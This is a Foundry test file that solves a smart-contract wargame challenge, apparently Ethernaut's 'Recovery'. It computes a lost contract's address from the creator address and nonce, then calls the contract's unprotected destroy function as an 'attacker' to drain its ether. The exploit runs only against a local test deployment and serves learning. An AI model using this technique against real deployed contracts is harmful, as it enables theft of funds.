// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {DeployRecoveryScript} from "@script/17_DeployRecovery.s.sol";

import {SimpleToken} from "@main/17_Recovery.sol";


contract RecoveryTest is Test, DeployRecoveryScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);
        
        DeployRecoveryScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        // sha3(rlp.encode([normalize_address(sender), nonce]))

        // RLP for 20 byte address will be 0xd6, 0x94
        // RLP for nounce of 1 will be 0x1
        address payable lostContract = payable(address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recoveryChallenge), bytes1(0x01)))))
        ));

        assertEq(lostContract.balance, 0.001 ether);
        SimpleToken(lostContract).destroy(payable(attacker));
        assertEq( lostContract.balance, 0 ether);
        assertEq( attacker.balance, 0.001 ether);
       
        vm.stopPrank(  );
    }

}